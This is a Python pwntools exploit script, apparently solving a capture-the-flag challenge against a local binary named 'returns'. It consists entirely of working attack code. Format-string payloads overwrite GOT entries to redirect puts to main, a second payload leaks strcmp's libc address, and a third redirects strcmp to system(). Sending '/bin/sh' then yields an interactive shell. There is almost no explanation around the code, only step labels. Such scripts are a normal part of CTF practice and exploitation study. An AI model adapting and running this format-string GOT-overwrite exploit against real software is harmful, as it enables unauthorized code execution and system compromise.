#!/usr/bin/python
from pwn import *

get_ret_addr = "%17$x"


payload = "%"

puts_got_original_content = 0x401016
puts_got = 0x404018
main = 0x4011a6

####################################
##### "____%9$p" + "AAAAAAAA"
####################

p = process("./returns")


## payload 1 : *puts_got = &main

first  =  main & 0xffff
second =  ( 0x10000 + (main >> 16) - first ) & 0xffff
payload = "%" + str(first).rjust(8-2, "0") + "x"
payload += "%0012$hn"
payload += "%" + str(second).rjust(8-2, "0") + "x"
payload += "%0013$hn"
# "\xaa" because buf[strlen(buf)-1] = "\x00" #
payload += "\x18\x40\x40\xaa\x00\x00\x00\x00" + p64( puts_got + 2)


p.recvuntil("What item would you like to return?")
p.sendline(payload)

with open("payload", "wb") as f :
    f.write(payload)
    f.close()




## payload 2 : leak printf got
strcmp_got = 0x404048

payload = "____%9$s" + "\x48\x40\x40\xaa\x00\x00\x00\x00"
p.recvuntil("What item would you like to return?")
p.sendline(payload)

leak = p.recvuntil("\x48\x40\x40")
leak = leak[leak.find("____")+4:-3]
strcmp_rand = u64(leak.ljust(8, "\x00"))
print "leaking address : %.16x" % u64(leak.ljust(8, "\x00"))

## payload 3 : change strcmp_rand() to system()
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_strcmp_sse2_unaligned = strcmp_original_content = 0x7ffff7a8de70
libc_system = 0x7ffff7a33440

system_rand = strcmp_rand + libc_system - libc_strcmp_sse2_unaligned
print "hex address of system is %s" % hex(system_rand)

first  = system_rand & 0xffff
second = (0x10000 + ( system_rand >> 16 ) - first ) & 0xffff
print first, second

# just change the least significant 4 bytes

payload  = "%" + str(first).rjust(6, "0") + "x"
payload += "%0012$hn"
payload += "%" + str(second).rjust(6, "0") + "x"
payload += "%0013$hn"
payload += "\x48\x40\x40\xaa\x00\x00\x00\x00" + p64(strcmp_got+2)

with open("payload", "wb") as f:
    f.write(payload)
    f.close()

p.recvuntil("What item would you like to return?")
p.sendline(payload)
## payload 4 : strcmp("/bin/sh", "nothing") -> system("/bin/sh")

payload = "/bin/sh\x01"

p.recvuntil("What item would you like to return?")
p.sendline(payload)
p.interactive()
